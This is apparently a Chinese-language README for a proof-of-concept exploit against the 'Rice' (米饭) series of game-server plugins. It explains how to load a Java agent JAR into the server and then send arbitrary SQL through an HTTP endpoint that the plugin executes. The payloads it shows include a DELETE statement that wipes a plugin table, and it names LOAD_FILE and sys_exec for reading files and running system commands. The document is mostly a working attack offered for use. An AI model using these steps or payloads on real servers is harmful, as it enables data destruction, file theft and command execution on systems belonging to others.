# 米饭系列 插件远程SQL执行 漏洞利用
#### 为保护作者权益 本项目 无法直接构建,需使用者请使用 JAR文件。并且 本项目 并不破解米饭验证功能，不验证 任然 无法使用 限制功能。

### 使用方法

1. 将该 JAR 放置到有米饭插件的服务端目录
2. 增加 `-javaagent:Rice-CloudSQL-POC-1.0-SNAPSHOT.jar`<br>
例如: `java -javaagent:Rice-CloudSQL-POC-1.0-SNAPSHOT.jar java.jar`
3. 启动服务端
4. 使用`http://127.0.0.1:8080/api/public/db/fake?sql={自定义SQL字符串}`<br>
例如: `http://127.0.0.1:8080/api/public/db/fake?sql=DELETE /*{对应米饭插件的表(例如: guild_spawn_pvp_location)}*/ FROM guild_spawn_pvp_location`<br>
这里可以是 任何SQL字符串 包括但不限于 `LOAD_FILE` `sys_exec`
5. 等待插件从服务端读取SQL并执行